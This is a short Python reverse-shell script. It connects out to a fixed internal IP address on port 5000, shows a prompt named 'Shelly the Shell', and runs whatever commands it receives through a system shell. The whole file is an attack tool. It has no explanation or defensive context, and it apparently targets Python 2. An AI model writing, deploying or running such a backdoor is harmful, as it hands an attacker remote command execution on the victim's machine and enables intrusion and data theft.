#!/usr/bin/python
import socket, subprocess
host = '10.0.0.192'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((host, 5000))
while True:
    s.send("Shelly the Shell $")
    res = s.recv(1024)
    subprocess.call(res, stdout=s, shell=True)
s.close()
